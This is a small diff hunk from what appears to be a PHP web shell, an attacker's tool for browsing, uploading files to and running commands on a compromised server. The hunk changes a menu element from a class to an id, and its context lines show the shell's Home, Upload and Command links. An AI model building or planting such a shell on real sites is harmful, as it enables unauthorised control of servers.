@@ -862,7 +862,7 @@ ___  ___         ______                 _              _
   echo "<hr color=deepskyblue>";
   echo "<center>";
   echo "<ul>";
-  echo "<div class=menu>";
+  echo "<div id=menu>";
   echo "<a href='?'>Home</a>";
   echo "<a href='?dir=$dir&do=upload'>Upload</a>";
   echo "<a href='?dir=$dir&do=command'>Command</a>";
